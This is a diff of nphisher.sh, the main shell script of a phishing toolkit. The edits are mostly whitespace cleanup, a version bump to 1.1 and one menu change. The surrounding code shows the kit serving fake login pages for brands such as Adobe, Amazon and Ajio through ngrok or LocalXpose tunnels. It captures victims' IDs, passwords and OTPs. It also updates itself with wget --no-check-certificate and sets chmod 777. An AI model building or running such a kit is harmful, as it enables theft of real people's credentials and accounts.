@@ -2,23 +2,23 @@
 ##COLOUR VARIABLES
 
 #Text
-RED="$(printf '\033[31m')" 
-GREEN="$(printf '\033[32m')"  
-ORANGE="$(printf '\033[33m')"  
+RED="$(printf '\033[31m')"
+GREEN="$(printf '\033[32m')"
+ORANGE="$(printf '\033[33m')"
 BLUE="$(printf '\033[34m')"
-MAGENTA="$(printf '\033[35m')"  
-CYAN="$(printf '\033[36m')"  
-WHITE="$(printf '\033[37m')" 
+MAGENTA="$(printf '\033[35m')"
+CYAN="$(printf '\033[36m')"
+WHITE="$(printf '\033[37m')"
 BLACK="$(printf '\033[30m')"
 NC='\033[0m' #Reset colour
 #Background
-REDBG="$(printf '\033[41m')"  
-GREENBG="$(printf '\033[42m')"  
-ORANGEBG="$(printf '\033[43m')"  
+REDBG="$(printf '\033[41m')"
+GREENBG="$(printf '\033[42m')"
+ORANGEBG="$(printf '\033[43m')"
 BLUEBG="$(printf '\033[44m')"
-MAGENTABG="$(printf '\033[45m')"  
-CYANBG="$(printf '\033[46m')"  
-WHITEBG="$(printf '\033[47m')" 
+MAGENTABG="$(printf '\033[45m')"
+CYANBG="$(printf '\033[46m')"
+WHITEBG="$(printf '\033[47m')"
 BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')" #Reset background
 
@@ -54,7 +54,7 @@ cbanner(){
 	echo -e "${RED} ╚═╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
 	echo -e "${CYAN}                                                  By - ${RED}Alygnt${NC}"
 	echo -e "${CYAN}        ${NC} "
-	echo -e "${GREEN}                           Version 1.0 ${NC}"
+	echo -e "${GREEN}                           Version 1.1 ${NC}"
 	echo -e "${CYAN}        ${NC} "
 }
 #Small Banner
@@ -159,7 +159,7 @@ xpermission(){
 		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
 	else
 	        chmod 777 nphisher.sh
-	        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!" 
+	        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
 	fi
 }
 
@@ -167,10 +167,10 @@ xpermission(){
 check_update() {
 	rm -rf version.txt
 	rm -rf core/update/tmp/version.txt
-	
+
 	wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/NPhisher/main/core/update/version.txt > /dev/null 2>&1
 	mv version.txt core/update/tmp
-	
+
 	current_ver=$( cat core/update/version.txt )
 	lat_ver=$( cat core/update/tmp/version.txt )
 	if [ $current_ver == $lat_ver ]; then
@@ -205,7 +205,7 @@ update() {
 	rm -rf NPhisher
 	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} REINSTALLING THE TOOL ${NC} "
 	git clone https://github.com/Alygnt/NPhisher
-	
+
 	if [ -d NPhisher ]; then
 		cd NPhisher
 	        mv $HOME/nphisher/ngrok .server
@@ -219,7 +219,7 @@ update() {
 	        sleep 2
 	        bash nphisher.sh
 		echo  " "
-	else 
+	else
 		echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED} SORRY, ERROR OCCURED!! TRY REINSTALLING MANUALLY!! ${NC} "
 	fi
 
@@ -319,7 +319,7 @@ start_ngrok() {
         echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
         ngrok_token_check
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & 
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     else
         sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
@@ -391,7 +391,7 @@ install_localxpose() {
 auth_localxpose() {
 	./.server/loclx -help > /dev/null 2>&1 &
 	sleep 1
-	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
+	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"
 
 	[ "$(./.server/loclx account status | grep Error)" ] && {
 		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
@@ -405,7 +405,7 @@ auth_localxpose() {
 	}
 }
 
-## Start LocalXpose 
+## Start LocalXpose
 start_loclx() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; auth_localxpose; }
@@ -569,14 +569,14 @@ capture_data_check(){
                 capture_data_2
         elif [ -f .sites/$website/POTP ];then
                 capture_data_3
-	else 
+	else
 		echo " Error Occured!!"
         fi
 
 #no 1- id pass
 # no 2 - id otp
 # no 3 - id pass otp
-} 
+}
 
 ## Get credentials
 capture_id() {
@@ -682,7 +682,7 @@ logs_check() {
 		logs_menu
 	else
 		echo "No logs found"
-		{ sleep 1; clear; tunnel_menu; }
+		{ sleep 1; clear; mainmenu; }
 	fi
 }
 logs_menu() {
@@ -802,7 +802,7 @@ case $reply in
 		tunnel_menu;;
 	3 | 03)
                 site_airtelxstream;;
-	4 | 04) 
+	4 | 04)
 		site_ajio;;
 	5 | 05)
                 site_amazon;;
@@ -982,7 +982,7 @@ echo -e " ${NC}"
 read -p "${MAGENTA} YOUR CHOICE : " choice
 
 case $choice in
-	1 | 01) 
+	1 | 01)
 		website="adobe"
 		tunnel_menu;;
 	2 | 02)
